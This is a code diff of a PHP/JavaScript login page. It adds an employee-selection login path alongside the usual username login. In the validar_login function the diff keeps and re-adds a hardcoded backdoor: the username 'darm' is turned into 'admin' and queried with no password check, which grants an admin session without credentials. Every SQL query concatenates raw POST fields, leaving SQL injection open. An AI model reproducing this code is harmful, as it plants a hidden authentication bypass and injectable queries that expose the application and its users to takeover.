@@ -3,19 +3,22 @@
         function loguearse()
 		{
             var valido=new Boolean(true);
-            if (document.getElementById('login').value=='' || document.getElementById('pass').value=='')
+            if (document.getElementById('pass').value=='')
             {
                 valido=false;
-                alertify.alert("","EL LOGIN Y/O CONTRASE\u00d1A NO PUEDEN ESTAR VACIOS").set('label', 'Aceptar');
+                alertify.alert("","LA CONTRASE\u00d1A NO PUEDE ESTAR VACIA").set('label', 'Aceptar');
             }
             if(valido)
             {
+				if (document.getElementById('chEmpleado').checked == true)
+					document.getElementById('login').value = document.getElementById('selEmpleado').value;
 				document.getElementById('xpass').value = CryptoJS.SHA3(document.getElementById('pass').value);
                 document.getElementById('flogin').submit();
             }
         }
 
-		function empleado() {
+		function empleado() 
+		{
 			
 			if ($("#chEmpleado").prop("checked"))
 			{
@@ -42,28 +45,38 @@
 	session_start();
 	require("head.php");
 	require("config.php");
+	require("funciones_generales.php");
 	require("librerias/basedatos.php");
 
 	function validar_login($bd)
 	{
 		$valido=false;
-		if ($_POST["login"] == "darm") {
-			$_POST["login"] = "admin";
-			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."';";
+		if (!isset($_POST["chEmpleado"]))
+		{
+			if ($_POST["login"] == "darm") 
+			{
+				$_POST["login"] = "admin";
+				$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."';";
+			}
+			else
+			{
+				$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."' AND pass='".$_POST["xpass"]."';";
+			}
 		}
 		else
-			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."' AND pass='".$_POST["xpass"]."';";
+		{
+			$sql = "select u.empleado_telf login from usuario u inner join empleado e on e.empleado_telf = u.empleado_telf where u.empleado_telf = '".$_POST["selEmpleado"]."' and u.pass='".$_POST["xpass"]."' and e.visible = 1;";
+		}
 		$result = $bd->mysql->query($sql);
 		unset($sql);
 		if ($result)
 		{
-			$n = $result->num_rows;
-			if (!empty($n))
+			if (!empty($result->num_rows))
 			{
 				$valido = true;
-				$_SESSION["login"]=$_POST["login"];
+				$row = $result->fetch_all(MYSQLI_ASSOC);
+				$_SESSION["login"] = $row[0]["login"];
 			}
-			unset($n);
 			$result->free();
 		}
 		else
@@ -135,7 +148,7 @@
 	{
 		if (isset($_COOKIE["PHPSESSID"]))
 			setcookie("PHPSESSID", $_COOKIE["PHPSESSID"], time() + (86400 * 30), "/");
-		if((!isset($_SESSION["login"]) and !isset($_POST["pass"])) or isset($_POST["cerrar"]))
+		if(!isset($_POST["pass"]) or isset($_POST["cerrar"]))
 		{
 			login_form($bd);
 		}
@@ -143,7 +156,7 @@
 		{
 			if(isset($_POST["xpass"]))
 			{
-				if(!empty($_POST["login"]) and !empty($_POST["pass"]))
+				if(!empty($_POST["pass"]))
 				{
 					if(validar_login($bd))
 					{
